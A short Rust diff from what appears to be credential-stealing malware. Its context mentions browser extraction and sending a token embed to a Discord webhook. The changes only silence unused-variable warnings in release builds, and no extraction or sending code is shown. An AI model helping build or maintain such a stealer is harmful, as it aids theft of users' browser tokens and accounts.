@@ -269,12 +269,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                         "discord webhook token embed: HTTP {}",
                                                                         resp.status()
                                                                     ));
+                                                                    let _ = resp;
                                                                 }
                                                                 Err(err) => {
                                                                     #[cfg(debug_assertions)]
                                                                     log::log(&format!(
                                                                         "discord webhook token embed ERR: {err}"
                                                                     ));
+                                                                    let _ = err;
                                                                 }
                                                             }
                                                         }
@@ -312,6 +314,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         Err(e) => {
             #[cfg(debug_assertions)]
             log::log(&format!("browser extraction ERR: {e}"));
+            let _ = e;
         }
     }
 
